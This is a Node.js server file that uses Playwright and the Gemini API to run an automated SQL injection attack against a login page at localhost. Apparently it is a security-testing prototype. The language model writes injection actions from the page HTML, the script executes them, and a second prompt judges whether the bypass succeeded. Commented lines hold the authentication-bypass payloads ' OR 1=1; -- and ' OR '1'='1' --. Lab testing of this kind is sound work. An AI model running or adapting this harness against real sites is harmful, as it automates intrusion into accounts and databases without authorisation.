const express = require('express');
const { chromium } = require('playwright');
const { GoogleGenerativeAI } = require("@google/generative-ai");
const { buildSqlInjectionPrompt, buildAnalysisPrompt } = require('./prompts.js');
require('dotenv').config();

const app = express();

// await page.fill('input[name="username"]', "' OR 1=1; --");

// //  Enter a placeholder password
//   await page.fill('input[name="password"]', "password");

// //  Click the login button
//   await page.click('button:text("Login")');

// await page.screenshot({ path: 'example.png' });

const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });

app.get('/run-task', async (req, res) => {
  const browser = await chromium.launch({ headless: false });
  const page = await browser.newPage();

  await page.goto('http://localhost:3000/');

  // 5 iterations to run attack
  for (let i = 0; i < 5; i++) {
    const context = await page.content();
    const prompt = buildSqlInjectionPrompt(context);
    const result = await model.generateContent(prompt);
    console.log(result.response.text());
    const actions = JSON.parse(result.response.text());

    // const actions = [
    //   {
    //     "action": "fill",
    //     "element": "input[name=\"username\"]",
    //     "value": "' OR '1'='1' --"
    //   },
    //   {
    //     "action": "fill",
    //     "element": "input[name=\"password\"]",
    //     "value": "x"
    //   },
    //   {
    //     "action": "click",
    //     "element": "button",
    //     "value": ""   
    //   }
    // ]
    
    // Stop iterating if response is an empty array
    if (actions.length === 0 || i >= 2) {
      console.log('No more actions available, stopping iterations');
      break;
    }
    
    for (const action of actions) {
      if (action.action === "fill") {
        await page.fill(action.element, action.value);
      } else if (action.action === "click") {
        await page.click(action.element);
      }
    }
  }
  
  // After iterations, analyze if SQL injection was successful
  const finalPageContent = await page.content();
  const analysisPrompt = buildAnalysisPrompt(finalPageContent);
  const analysisResult = await model.generateContent(analysisPrompt);
  const analysis = analysisResult.response.text();
  
  console.log('SQL Injection Analysis:', analysis);
  
  // Wait 10 seconds before closing the browser
  await new Promise(resolve => setTimeout(resolve, 3000));
  
  await browser.close();
  res.send({ 
    result: analysis,
    analysis: analysis,
    pageContent: finalPageContent
  });
});

app.listen(3001, () => console.log('Server running on port 3001'));